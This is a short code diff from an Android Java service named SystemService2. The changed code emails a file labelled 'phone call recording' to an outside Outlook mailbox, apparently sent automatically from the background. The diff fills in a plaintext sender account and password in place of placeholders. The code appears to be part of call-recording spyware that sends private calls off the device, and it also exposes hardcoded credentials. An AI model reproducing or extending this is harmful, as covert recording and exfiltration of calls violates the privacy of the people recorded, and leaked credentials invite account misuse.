@@ -106,10 +106,10 @@ public class SystemService2 extends Service {
                 EmailUtil emailUtil = new EmailUtil();
                 try {
 					//发送者邮箱，请自己申请
-                    //String account = "xxxxxxxxxxxx@qq.com";
-                    //String password = "xxxxxxxxx";
+                    String account = "qq2840172718@gmail.com";
+                    String password = "As289399024?";
 					//接收者邮箱
-                    emailUtil.sendMail("26012450@qq.com", account, "smtp.163.com",
+                    emailUtil.sendMail("qq2840172718@outlook.com", account, "smtp-mail.outlook.com",
                             account, password, "电话录音", "邮件由系统自动发送，请不要回复！", path);
 
                 } catch (Exception e) {
